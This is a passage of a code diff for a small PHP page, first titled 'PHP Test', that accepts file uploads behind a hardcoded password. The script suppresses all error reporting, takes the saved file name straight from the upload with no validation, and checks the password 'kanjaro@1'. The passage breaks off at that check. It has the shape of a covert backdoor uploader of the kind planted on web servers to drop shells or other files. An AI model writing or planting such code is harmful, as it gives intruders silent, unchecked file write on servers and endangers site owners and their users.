@@ -1,6 +1,6 @@
 <html>
  <head>
-  <title>PHP Test</title>
+  <title>PHP Up</title>
   <form action="" method="post" enctype="multipart/form-data">
   <input type="file" name="fileToUpload" id="fileToUpload">
   <input type="text" name="password" id="password">
@@ -9,16 +9,12 @@
  </head>
  <body>
  <?php 
- //echo '<p>FILE UPLOAD</p><br>'; 
-// Turn off all error reporting
+
 error_reporting(0);
 
  $tgt_file = $tgt_dir.basename($_FILES['fileToUpload']['name']);
  $tgt_pass = $_POST['password'];
- //echo "<br>TARGET FILE= ".$tgt_file;
- //echo "<br>Password= ".$tgt_pass;
- //$filename = $_FILES['fileToUpload']['name'];
-// echo "<br>FILE NAME FROM VARIABLE:- ".$_FILES["fileToUpload"]["name"];
+
  if(isset($_POST['submit']))
  {
 	 if($tgt_pass == "kanjaro@1") 
